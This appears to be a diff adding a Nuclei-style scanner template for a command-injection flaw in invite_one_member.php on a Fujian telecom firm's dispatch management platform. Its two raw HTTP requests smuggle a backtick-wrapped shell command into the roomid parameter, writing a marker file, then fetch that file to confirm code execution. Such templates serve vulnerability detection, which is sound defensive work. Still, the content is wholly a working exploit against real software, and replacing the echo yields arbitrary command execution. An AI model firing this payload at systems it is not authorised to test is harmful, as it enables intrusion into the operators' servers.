@@ -1,0 +1,35 @@
+id: command-dispatch-invite-one-member-rce
+info:
+  name: dispatch invite_one_member - Remote Code Execution
+  author: qwtd
+  severity: high
+  description: |
+    福建科立讯通信有限公司指挥调度管理平台invite_one_member.php 任意命令执行漏洞
+  tags: 指挥调度管理平台
+
+http:
+  - raw:
+      - |
+        GET /api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`echo randstr123456>1.txt` HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+      - |
+        GET /api/client/audiobroadcast/1.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'randstr123456'
+
+      - type: status
+        status:
+          - 200
